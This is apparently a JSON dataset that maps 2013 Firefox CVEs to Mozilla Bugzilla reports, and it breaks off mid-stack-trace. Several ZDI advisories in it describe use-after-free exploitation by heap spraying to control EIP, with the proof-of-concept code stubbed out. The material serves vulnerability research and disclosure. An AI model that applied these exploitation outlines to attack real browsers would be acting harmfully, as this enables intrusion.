{
  "year": 2013,
  "total": 146,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2013-0744": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=814713",
        "title": "Heap-use-after-free in TableBackgroundPainter::TableBackgroundData::Destroy",
        "description": "Tested on: OS: Ubuntu 12.04 x86_64 Firefox build: https://people.mozilla.com/~choller/firefox/asan/20121123-mozilla-central-linux64-debug-d8e4f06198dc+asan.html ASAN-report snippet: ###!!! ASSERTION: colgroup data should not be null - bug 237421: 'mCols[i].mColGroup', file /builds/slave/try-lnx64-dbg/build/layout/tables/nsTablePainter.cpp, line 314 ###!!! ASSERTION: colgroup data should not be null - bug 237421: 'mCols[i].mColGroup', file /builds/slave/try-lnx64-dbg/build/layout/tables/nsTablePainter.cpp, line 314 ================================================================= ==5093== ERROR: AddressSanitizer heap-use-after-free on address 0x7fb9757737a8 at pc 0x7fb99e71f5a3 bp 0x7fffd048eae0 sp 0x7fffd048ead8 READ of size 8 at 0x7fb9757737a8 thread T0 #0 0x7fb99e71f5a2 in TableBackgroundPainter::TableBackgroundData::Destroy(nsPresContext*) /builds/slave/try-lnx64-dbg/build/layout/tables/nsTablePainter.cpp:123 #1 0x7fb99e72016b in ~TableBackgroundPainter /builds/slave/try-lnx64-dbg/build/layout/tables/nsTablePainter.cpp:239 #2 0x7fb99e6df4b6 in nsTableFrame::PaintTableBorderBackground(nsRenderingContext&, nsRect const&, nsPoint, unsigned int) /builds/slave/try-lnx64-dbg/build/layout/tables/nsTableFrame.cpp:1310 #3 0x7fb99e6df1a8 in nsDisplayTableBorderBackground::Paint(nsDisplayListBuilder*, nsRenderingContext*) /builds/slave/try-lnx64-dbg/build/layout/tables/nsTableFrame.cpp:1086 #4 0x7fb99e20e74c in mozilla::FrameLayerBuilder::DrawThebesLayer(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*) /builds/slave/try-lnx64-dbg/build/layout/base/FrameLayerBuilder.cpp:3274 #5 0x7fb9a094c008 in mozilla::layers::BasicThebesLayer::PaintBuffer(gfxContext*, nsIntRegion const&, nsIntRegion const&, nsIntRegion const&, bool, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*) /builds/slave/try-lnx64-dbg/build/gfx/layers/basic/BasicThebesLayer.h:94 . . . freed by thread T0 here: #0 0x43f180 in operator delete(void*) ??:0 #1 0x7fb99e72017b in ~TableBackgroundPainter /builds/slave/try-lnx64-dbg/build/layout/tables/nsTablePainter.cpp:240 #2 0x7fb99e6df4b6 in nsTableFrame::PaintTableBorderBackground(nsRenderingContext&, nsRect const&, nsPoint, unsigned int) /builds/slave/try-lnx64-dbg/build/layout/tables/nsTableFrame.cpp:1310 #3 0x7fb99e6df1a8 in nsDisplayTableBorderBackground::Paint(nsDisplayListBuilder*, nsRenderingContext*) /builds/slave/try-lnx64-dbg/build/layout/tables/nsTableFrame.cpp:1086 #4 0x7fb99e20e74c in mozilla::FrameLayerBuilder::DrawThebesLayer(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*) /builds/slave/try-lnx64-dbg/build/layout/base/FrameLayerBuilder.cpp:3274 #5 0x7fb9a094c008 in mozilla::layers::BasicThebesLayer::PaintBuffer(gfxContext*, nsIntRegion const&, nsIntRegion const&, nsIntRegion const&, bool, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*) /builds/slave/try-lnx64-dbg/build/gfx/layers/basic/BasicThebesLayer.h:94 . . ."
      }
    ],
    "CVE-2013-0745": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=794158",
        "title": "Investigate if AutoWrapperChanger causes security problems",
        "description": "AutoWrapperChanger is a class used on stack. http://mxr.mozilla.org/mozilla-central/source/js/xpconnect/src/XPCWrappedNative.cpp?rev=ae68e6c539a2&mark=1406-1441#1406 I keeps the wrapper on stack to prevent it to be GCed, but if aCOMObj has pointers to also other JSObjects, I don't see what is keeping them alive, since AutoWrapperChanger's ctor calls nsContentUtils::ReleaseWrapper which ends up calling nsContentUtils::DropJSObjects. AutoWrapperChanger is on stack quite long time so I believe GC can happen between ctor and dtor. (I hope someone proves this isn't a problem.)"
      }
    ],
    "CVE-2013-0747": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733305",
        "title": "I can confuse gPluginHandler.handleEvent by listening for mutation events",
        "description": "JavaScript error: chrome://browser/content/browser.js, line 10437: iconStatus is null > let installStatus = doc.getAnonymousElementByAttribute(plugin, \"class\", \"installStatus\"); > installStatus.setAttribute(\"status\", \"ready\"); > let iconStatus = doc.getAnonymousElementByAttribute(plugin, \"class\", \"icon\"); > iconStatus.setAttribute(\"status\", \"ready\"); The page gets an event whose originalTarget is an anonymous DIV. I wouldn't expect the page to be able to get a reference to this anonymous content. Related to bug 329813?"
      }
    ],
    "CVE-2013-0748": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=806031",
        "title": "[FIX] XBL.__proto__.toString is ugly and reveals address space layout",
        "description": "Got: [object chrome://xbl-marquee/content/xbl-marquee.xml#marquee a646314] Expected in opt, don't reveal address space info: [object chrome://xbl-marquee/content/xbl-marquee.xml#marquee] Expected in debug, format it properly: [object chrome://xbl-marquee/content/xbl-marquee.xml#marquee @ 0x0a646314] I can't find the code that's doing this. But here's an example of code doing it right: http://mxr.mozilla.org/mozilla-central/source/js/xpconnect/src/XPCWrappedNativeJSOps.cpp#74"
      }
    ],
    "CVE-2013-0750": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=805121",
        "title": "String Replacement Heap Corruption Remote Code Execution Vulnerability (ZDI-CAN-1473)",
        "description": "ZDI-CAN-1473: Mozilla Firefox String Replacement Heap Corruption Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ An integer overflow is possible when calculating the length for a Javascript string concatenation. mozilla-release\\js\\src\\jsstr.cpp FindReplaceLength(JSContext *cx, RegExpStatics *res, ReplaceData &rdata, size_t *sizep) ... JSString *repstr = rdata.repstr; size_t replen = repstr->length(); for (const jschar *dp = rdata.dollar, *ep = rdata.dollarEnd; dp; dp = js_strchr_limit(dp, '$', ep)) { JSSubString sub; size_t skip; if (InterpretDollar(cx, res, dp, ep, rdata, &sub, &skip)) { replen += sub.length - skip; dp += skip; } else { dp++; } } *sizep = replen; return true; The for loop above illustrates the problem: the looped arithmetic operation to add to replen can result in replen wrapping. The code below shows the use of the above function in a vulnerable fashion: ReplaceRegExpCallback(JSContext *cx, RegExpStatics *res, size_t count, void *p) ... size_t replen = 0; /* silence 'unused' warning */ if (!FindReplaceLength(cx, res, rdata, &replen)) return false; size_t growth = leftlen + replen; if (!rdata.sb.reserve(rdata.sb.length() + growth)) return false; rdata.sb.infallibleAppend(left, leftlen); /* skipped-over portion of the search value */ DoReplace(cx, res, rdata); The call to FindReplaceLength can result in a wrapped replen value, which when used for allocation, causes an undersized allocation. Use of the undersized allocation results in memory corruption. -- CREDIT --------------------------------------- This vulnerability was discovered by: pa_kt / twitter.com/pa_kt"
      }
    ],
    "CVE-2013-0751": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=790454",
        "title": "Touch events are shared across iframes",
        "description": "Just did some quick tests to see what happens if users attempt to use touch events in two different iframes. In a page with two iframes next to one another, if you touch in one and then the touch in the other, we are able to see touches in the first iframe in the second (and vice versa). You can also look at the target of those touches. If they're both from the same origin, you can also access properties/methods on the target of the second. If they're from different domains, trying to access any properties/methods on that target will result in a \"Permission denied to access property\" exception being thrown. Test page: http://dl.dropbox.com/u/72157/iframetest.html Chrome for Android leaks the same touches, but also doesn't throw access restriction exceptions. Filed a bug with them: http://code.google.com/p/chromium/issues/detail?id=148567 iOS 5.1.1 it looks like touches in the second (right hand side) iframe are ignored all of the time. i.e. I never see any touches sent to the second iframe. If I start a drag in it and then move my finger into the first, I see no events until my finger is over the first document (doing that requires that I have touched the first document first so that they don't pan, but the touches I receive in the first document act as if there is only one finger on screen. i.e. its a bit of a mess)."
      }
    ],
    "CVE-2013-0752": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=805024",
        "title": "Crash when XML binding (XBL) includes another binding which contains SVG",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 Build ID: 20121010144125 Steps to reproduce: The XBL file contains two XML bindings, \"pie_chart\" and \"pie_chart_segment\". Both contain SVG. When you insert \"pie_chart_segment\" into \"pie_chart\" with the help of the <children/> XBL tag -- Firefox crashes. Reproducible: always. How to reporoduce: 1. Install 'Remote XUL Manager' addon, so you can open local XUL files https://addons.mozilla.org/en-US/firefox/addon/remote-xul-manager/ 2. Add a <file> record in Remote XUL Manager's allowed URL list 3. Unpack ff_xbl_svg_crash.zip 4. Open test.xul Firefox will crash."
      }
    ],
    "CVE-2013-0753": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=814001",
        "title": "[FIX] XMLSerializer Use-After-Free Remote Code Execution Vulnerability (ZDI-CAN-1608)",
        "description": "::gpgmail-start-pgp-part::ZDI-CAN-1608: Mozilla Firefox XMLSerializer Use-After-Free Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Version(s) Tested: Mozilla Firefox 13.0.1 Platform(s) Tested: Windows XP SP3 --------------------- Vulnerability details --------------------- From the researcher: From content/base/src/nsDOMSerializer.cpp: nsDocumentEncoder::SerializeToStringRecursive(nsINode* aNode, nsAString& aStr, bool aDontSerializeRoot) { ... if (!aDontSerializeRoot) { rv = SerializeNodeStart(maybeFixedNode, 0, -1, aStr, aNode); NS_ENSURE_SUCCESS(rv, rv); } ... } nsDocumentEncoder::SerializeNodeStart(nsINode* aNode, PRInt32 aStartOffset, PRInt32 aEndOffset, nsAString& aStr, nsINode* aOriginalNode) { ... if (node->IsElement()) { ... Element* originalElement = aOriginalNode && aOriginalNode->IsElement() ? aOriginalNode->AsElement() : nsnull; mSerializer->AppendElementStart(node->AsElement(), originalElement, aStr); return NS_OK; } ... } From content/base/src/nsXMLContentSerializer.cpp: nsXMLContentSerializer::AppendElementStart(Element* aElement, Element* aOriginalElement, nsAString& aStr) { ... if (!CheckElementStart(content, forceFormat, aStr)) { return NS_OK; } ... } From content/base/src/nsXHTMLContentSerializer.cpp: nsXHTMLContentSerializer::CheckElementStart(nsIContent * aContent, bool & aForceFormat, nsAString& aStr) { ... aForceFormat = aContent->HasAttr(kNameSpaceID_None, nsGkAtoms::mozdirty); ... } After reaching the use-after-free condition, we need to take over memory previously occupied by a deleted node. Thus, we force allocation of some strings that will make |child->GetNextSibling()| return memory address within predictable range of a heap spray. If data stored on a heap spray fulfils basic constraints (0x8 at offset of |mBoolFlags| for the sake of |node->IsElement()| being true), we are free to specify \"custom\" pointer to virtual function table. This way we can arbitrarily change program execution flow at |aContent->HasAttr()|. The code below triggers the vulnerability: --------------- Begin Code Snip --------------- <!doctype html> <!-- Mozilla Firefox 13.0.1 XMLSerializer use-after-free Windows XP SP3 x86 EIP control regenrecht@o2.pl Jul 2012 --> <html> <body onload=\"run();\"> </body> </html> --------------- End Code Snip --------------- This will create an XMLSerializer and an associated write function that will remove a node and spray the heap such that EIP will end up being c1c2c3c4 -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht -- FURTHER DETAILS ------------------------------ If supporting files were contained with this report they are provided within a password protected ZIP file. The password is the ZDI candidate number in the form: ZDI-CAN-XXXX where XXXX is the ID number. Please confirm receipt of this report. We expect all vendors to remediate ZDI vulnerabilities within 180 days of the reported date. If you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue. If the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch. Please keep us updated regarding the status of this issue and feel free to contact us at any time: Zero Day Initiative zdi-disclosures@tippingpoint.com The PGP key used for all ZDI vendor communications is available from: http://www.zerodayinitiative.com/documents/zdi-pgp-key.asc -- INFORMATION ABOUT THE ZDI --------------------- Established by TippingPoint, The Zero Day Initiative (ZDI) represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities. The ZDI is unique in how the acquired vulnerability information is used. TippingPoint does not re-sell the vulnerability details or any exploit code. Instead, upon notifying the affected product vendor, TippingPoint provides its customers with zero day protection through its intrusion prevention technology. Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available. Furthermore, with the altruistic aim of helping to secure a broader user base, TippingPoint provides this vulnerability information confidentially to security vendors (including competitors) who have a vulnerability protection or mitigation product. Please contact us for further information or refer to: http://www.zerodayinitiative.com -- DISCLOSURE POLICY ---------------------------- Our vulnerability disclosure policy is available online at: http://www.zerodayinitiative.com/advisories/disclosure_policy/::gpgmail-end-pgp-part::"
      }
    ],
    "CVE-2013-0754": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=814026",
        "title": "ListenerManager Use-After-Free Remote Code Execution Vulnerability (ZDI-CAN-1591)",
        "description": "-- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Version(s) Tested: Mozilla Firefox 12.0 Platform(s) Tested: Windows XP SP3 --------------------- Vulnerability details --------------------- The vulnerable function is ListenerManager::DispatchEvent within dom/workers/ListenerManager.cpp From the researcher: Registered event listeners are stored in temporary |js::Vector| before being called one by one. When the number of |jsval|s held in |listeners| exceeds 10, storage space for them is allocated on the heap. Thus, they are unreachable from garbage collector roots. During user-provided event handling callback, one is free to remove/unregister all the listeners and force garbage collection. |jsval|s kept in |listeners| will become dangling pointers. The code below triggers the vulnerability: --------------- Begin Code Snip --------------- <!DOCTYPE html> <!-- Mozilla Firefox 12.0 ListenerManager dangling pointer Windows XP SP3 x86 code exec regenrecht@o2.pl May 2012 --> <html> <head> </head> <body onload=\"run();\"> </body> </html> --------------- End Code Snip --------------- This code will create a listener that will erase all subsequent listeners and replace them with memory that'll result in EIP being c1c2c3c4 -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht -- FURTHER DETAILS ------------------------------ If supporting files were contained with this report they are provided within a password protected ZIP file. The password is the ZDI candidate number in the form: ZDI-CAN-XXXX where XXXX is the ID number. Please confirm receipt of this report. We expect all vendors to remediate ZDI vulnerabilities within 180 days of the reported date. If you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue. If the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch. Please keep us updated regarding the status of this issue and feel free to contact us at any time: Zero Day Initiative zdi-disclosures@tippingpoint.com The PGP key used for all ZDI vendor communications is available from: http://www.zerodayinitiative.com/documents/zdi-pgp-key.asc -- INFORMATION ABOUT THE ZDI --------------------- Established by TippingPoint, The Zero Day Initiative (ZDI) represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities. The ZDI is unique in how the acquired vulnerability information is used. TippingPoint does not re-sell the vulnerability details or any exploit code. Instead, upon notifying the affected product vendor, TippingPoint provides its customers with zero day protection through its intrusion prevention technology. Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available. Furthermore, with the altruistic aim of helping to secure a broader user base, TippingPoint provides this vulnerability information confidentially to security vendors (including competitors) who have a vulnerability protection or mitigation product. Please contact us for further information or refer to: http://www.zerodayinitiative.com -- DISCLOSURE POLICY ---------------------------- Our vulnerability disclosure policy is available online at: http://www.zerodayinitiative.com/advisories/disclosure_policy/"
      }
    ],
    "CVE-2013-0755": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=814027",
        "title": "[FIX] mozVibrate Use-After-Free Remote Code Execution Vulnerability (ZDI-CAN-1589)",
        "description": "-- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Version(s) Tested: Mozilla Firefox 13.0 Platform(s) Tested: Windows XP SP3 --------------------- Vulnerability details --------------------- The vulnerable function is Navigator::MozVibrate within dom/base/Navigator.cpp From the researcher: Note that |domDoc| is a weak pointer. As the \"logic\" of |JS_GetArrayLength()| is under attacker's control, it is possible to force removal of object currently pointed by |domDoc|. This will lead to |domDoc| becoming a dangling pointer after the |JS_GetArrayLength()| call. Such stale pointer is then passed to |VibrateWindowListener| constructor. The code below triggers the vulnerability: --------------- Begin Code Snip --------------- <!doctype html> <!-- Mozilla Firefox 13.0 mozVibrate dangling pointer Windows XP SP3 x86 code exec regenrecht@o2.pl Jun 2012 --> <html> <head> </head> <body onload=\"run();\"> </body> </html> --------------- End Code Snip --------------- This PoC will trigger the vulnerability and result in EIP being set to c1c2c1c2 -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht -- FURTHER DETAILS ------------------------------ If supporting files were contained with this report they are provided within a password protected ZIP file. The password is the ZDI candidate number in the form: ZDI-CAN-XXXX where XXXX is the ID number. Please confirm receipt of this report. We expect all vendors to remediate ZDI vulnerabilities within 180 days of the reported date. If you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue. If the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch. Please keep us updated regarding the status of this issue and feel free to contact us at any time: Zero Day Initiative zdi-disclosures@tippingpoint.com The PGP key used for all ZDI vendor communications is available from: http://www.zerodayinitiative.com/documents/zdi-pgp-key.asc -- INFORMATION ABOUT THE ZDI --------------------- Established by TippingPoint, The Zero Day Initiative (ZDI) represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities. The ZDI is unique in how the acquired vulnerability information is used. TippingPoint does not re-sell the vulnerability details or any exploit code. Instead, upon notifying the affected product vendor, TippingPoint provides its customers with zero day protection through its intrusion prevention technology. Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available. Furthermore, with the altruistic aim of helping to secure a broader user base, TippingPoint provides this vulnerability information confidentially to security vendors (including competitors) who have a vulnerability protection or mitigation product. Please contact us for further information or refer to: http://www.zerodayinitiative.com -- DISCLOSURE POLICY ---------------------------- Our vulnerability disclosure policy is available online at: http://www.zerodayinitiative.com/advisories/disclosure_policy/"
      }
    ],
    "CVE-2013-0756": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=814029",
        "title": "obj_toSource Use-After-Free Remote Code Execution Vulnerability (ZDI-CAN-1571)",
        "description": "-- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Tested on 16.0.2 From js/src/jsobj.cpp: obj_toSource(JSContext *cx, uintN argc, Value *vp) { ... JSObject *obj = ToObject(cx, &vp1); if (!obj) return false; JSHashEntry *he = js_EnterSharpObject(cx, obj, &amp;ida, &amp;chars); if (!he) return false; ... } js_EnterSharpObject(JSContext *cx, JSObject *obj, JSIdArray **idap, jschar **sp) { ... *sp = NULL; map = &cx->sharpObjectMap; ... ida = NULL; if (map->depth == 0) { ... ++map->depth; he = MarkSharpObjects(cx, obj, &amp;ida); --map->depth; ... } else { ... } ... } MarkSharpObjects(JSContext *cx, JSObject *obj, JSIdArray **idap) { ... map = &cx->sharpObjectMap; JS_ASSERT(map->depth >= 1); table = map->table; hash = js_hash_object(obj); hep = JS_HashTableRawLookup(table, hash, obj); he = *hep; if (!he) { ... ida = JS_Enumerate(cx, obj); if (!ida) return NULL; ok = JS_TRUE; for (i = 0, length = ida->length; i < length; i++) { id = ida->vector[i]; ok = obj->lookupGeneric(cx, id, &amp;obj2, &amp;prop); ... } ... } else { ... } ... } Note that |jsid|s stored at |ida| are unrooted during execution of |obj_toSource()| and its sub-functions. This means that after successful call to |JS_Enumerate()| one can drop (previously returned) |jsid|s from the parent object and force their removal due to garbage collection. It can be done during call to |obj->lookupGeneric()|. Such action will lead to a dangling pointer vulnerability at the following |for| iteration: |ida->vector[i]| will contain pointer to already freed object. ------- Exploit ------- 1. Create JavaScript Proxy object with the following characteristics: a) Handler method \"get\" returns dummy data just to fulfill the contract with the iterator. b) Handler method \"has\" always returns \"true\" to prolong process of iterating over properties. It also sprays the heap and forces garbage collection. c) Handler method \"keys\" returns bogus unrooted list of properties. Instances of E4X QName class are used for the sake of reliability. 2. Call JavaScript object's |toSource()| method - this leads to a dangling pointer condition. -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht -- FURTHER DETAILS ------------------------------ If supporting files were contained with this report they are provided within a password protected ZIP file. The password is the ZDI candidate number in the form: ZDI-CAN-XXXX where XXXX is the ID number. Please confirm receipt of this report. We expect all vendors to remediate ZDI vulnerabilities within 180 days of the reported date. If you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue. If the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch. Please keep us updated regarding the status of this issue and feel free to contact us at any time: Zero Day Initiative zdi-disclosures@tippingpoint.com The PGP key used for all ZDI vendor communications is available from: http://www.zerodayinitiative.com/documents/zdi-pgp-key.asc -- INFORMATION ABOUT THE ZDI --------------------- Established by TippingPoint, The Zero Day Initiative (ZDI) represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities. The ZDI is unique in how the acquired vulnerability information is used. TippingPoint does not re-sell the vulnerability details or any exploit code. Instead, upon notifying the affected product vendor, TippingPoint provides its customers with zero day protection through its intrusion prevention technology. Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available. Furthermore, with the altruistic aim of helping to secure a broader user base, TippingPoint provides this vulnerability information confidentially to security vendors (including competitors) who have a vulnerability protection or mitigation product. Please contact us for further information or refer to: http://www.zerodayinitiative.com -- DISCLOSURE POLICY ---------------------------- Our vulnerability disclosure policy is available online at: http://www.zerodayinitiative.com/advisories/disclosure_policy/"
      }
    ],
    "CVE-2013-0757": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=813901",
        "title": "Chrome Object Wrapper can be bypassed using Object.prototype.__proto__",
        "description": "It is possible to change the prototype of an object wrapped in a cross-compartment wrapper if the setter of Object.prototype.__proto__ is called in the context of the wrapper. This can be used against chrome objects that don't explicitly define __exposedProps__ to gain access to privileged methods. This bug appears to have been introduced in Firefox 17, the earlier versions don't have accessors on __proto__."
      }
    ],
    "CVE-2013-0758": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=813906",
        "title": "Content can access chrome-privileged pages using plugin objects",
        "description": "It is possible to open chrome-privileged pages via plugin instances cloned into anonymous content of the SVG \"use\" element. The root of the problem lies in the method nsPluginInstanceOwner::GetURL, which may resolve a relative path against a chrome URI and pass it to the OnLinkClick handler method. In theory, such URI should be rejected earlier in nsPluginHost::GetURLWithHeaders, where DoURLLoadSecurityCheck is called, but there's a discrepancy between how nsPluginHost::DoURLLoadSecurityCheck and nsIContent::GetBaseURI derive the baseURI. This inconsistency allows a malicious website to load an arbitrary chrome page in a frame and use it to escalate privileges in drive-by download attacks."
      }
    ],
    "CVE-2013-0759": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=802026",
        "title": "URL spoofing with credentials info of URL & 204",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20100101 Firefox/16.0 Build ID: 20121010144125 Steps to reproduce: 1. Go to attachment file and click \"go\" button. 2. Address bar points \"google.com\". But in fact, it is not \"google.com\". Expected results: Firefox should display URL correctly."
      }
    ],
    "CVE-2013-0761": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=787831",
        "title": "Heap-use-after-free in mozilla::TrackUnionStream::EndTrack",
        "description": "Reproduces on trunk MediaStreamGraphImpl::FinishStream MediaStreamGraphImpl::FinishStream nsBuiltinDecoderStateMachine::RunStateMachine queuing nsBuiltinDecoder::PlaybackEnded ================================================================= ==26602== ERROR: AddressSanitizer heap-use-after-free on address 0x7f9ea7933198 at pc 0x7f9ec9a0034e bp 0x7f9e8f5ea310 sp 0x7f9e8f5ea308 READ of size 1 at 0x7f9ea7933198 thread T14 #0 0x7f9ec9a0034d in mozilla::StreamBuffer::Track::IsEnded() const src/content/media/StreamBuffer.h:125 #1 0x7f9ec9a03db5 in mozilla::TrackUnionStream::EndTrack(unsigned int) src/content/media/TrackUnionStream.h:148 #2 0x7f9ec99ff3e8 in mozilla::TrackUnionStream::ProduceOutput(long, long) src/content/media/TrackUnionStream.h:83 #3 0x7f9ec99bd827 in mozilla::MediaStreamGraphImpl::RunThread() src/content/media/MediaStreamGraph.cpp:1395 #4 0x7f9ec9a1b272 in mozilla::(anonymous namespace)::MediaStreamGraphThreadRunnable::Run() src/content/media/MediaStreamGraph.cpp:1510 #5 0x7f9ecfa2949e in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #6 0x7f9ecf6ca877 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #7 0x7f9ecfa213c5 in nsThread::ThreadFunc(void*) src/xpcom/threads/nsThread.cpp:257 #8 0x7f9edea519c3 in _pt_root src/nsprpub/pr/src/pthreads/ptthread.c:156 #9 0x4c6f8b in __asan::AsanThread::ThreadStart() ??:0 0x7f9ea7933198 is located 24 bytes inside of 32-byte region [0x7f9ea7933180,0x7f9ea79331a0) freed by thread T14 here: #0 0x4c3e30 in free ??:0 #1 0x7f9edc76d572 in moz_free src/memory/mozalloc/mozalloc.cpp:51 #2 0x7f9ec99f668e in operator delete(void*) src/../../dist/include/mozilla/mozalloc.h:224 #3 0x7f9ec99f64c2 in ~nsAutoPtr src/../../dist/include/nsAutoPtr.h:70 #4 0x7f9ec99f63b2 in nsTArrayElementTraits<nsAutoPtr<mozilla::StreamBuffer::Track> >::Destruct(nsAutoPtr<mozilla::StreamBuffer::Track>*) src/../../dist/include/nsTArray.h:348 #5 0x7f9ec99f60b3 in nsTArray<nsAutoPtr<mozilla::StreamBuffer::Track>, nsTArrayDefaultAllocator>::DestructRange(unsigned int, unsigned int) src/../../dist/include/nsTArray.h:1213 #6 0x7f9ec99f5b5c in nsTArray<nsAutoPtr<mozilla::StreamBuffer::Track>, nsTArrayDefaultAllocator>::RemoveElementsAt(unsigned int, unsigned int) src/../../dist/include/nsTArray.h:933 #7 0x7f9ec9b0dc58 in nsTArray<nsAutoPtr<mozilla::StreamBuffer::Track>, nsTArrayDefaultAllocator>::RemoveElementAt(unsigned int) src/../../dist/include/nsTArray.h:939 #8 0x7f9ec9b0d630 in mozilla::StreamBuffer::ForgetUpTo(long) src/content/media/StreamBuffer.cpp:51 #9 0x7f9ec99cff93 in mozilla::MediaStream::AdvanceTimeVaryingValuesToCurrentTime(long, long) src/content/media/MediaStreamGraph.h:385 #10 0x7f9ec99a441b in mozilla::MediaStreamGraphImpl::UpdateCurrentTime() src/content/media/MediaStreamGraph.cpp:816 #11 0x7f9ec99bc7da in mozilla::MediaStreamGraphImpl::RunThread() src/content/media/MediaStreamGraph.cpp:1352 #12 0x7f9ec9a1b272 in mozilla::(anonymous namespace)::MediaStreamGraphThreadRunnable::Run() src/content/media/MediaStreamGraph.cpp:1510 #13 0x7f9ecfa2949e in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #14 0x7f9ecf6ca877 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #15 0x7f9ecfa213c5 in nsThread::ThreadFunc(void*) src/xpcom/threads/nsThread.cpp:257 #16 0x7f9edea519c3 in _pt_root src/nsprpub/pr/src/pthreads/ptthread.c:156 #17 0x4c6f8b in __asan::AsanThread::ThreadStart() ??:0 previously allocated by thread T14 here: #0 0x4c3ef0 in __interceptor_malloc ??:0 #1 0x7f9edc76d6c6 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 #2 0x7f9ec999de8d in operator new(unsigned long) src/../../dist/include/mozilla/mozalloc.h:200 #3 0x7f9ec9a0343f in mozilla::TrackUnionStream::AddTrack(mozilla::MediaInputPort*, mozilla::StreamBuffer::Track*, long) src/content/media/TrackUnionStream.h:133 #4 0x7f9ec99fefd2 in mozilla::TrackUnionStream::ProduceOutput(long, long) src/content/media/TrackUnionStream.h:74 #5 0x7f9ec99bd827 in mozilla::MediaStreamGraphImpl::RunThread() src/content/media/MediaStreamGraph.cpp:1395 #6 0x7f9ec9a1b272 in mozilla::(anonymous namespace)::MediaStreamGraphThreadRunnable::Run() src/content/media/MediaStreamGraph.cpp:1510 #7 0x7f9ecfa2949e in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #8 0x7f9ecf6ca877 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #9 0x7f9ecfa213c5 in nsThread::ThreadFunc(void*) src/xpcom/threads/nsThread.cpp:257 #10 0x7f9edea519c3 in _pt_root src/nsprpub/pr/src/pthreads/ptthread.c:156 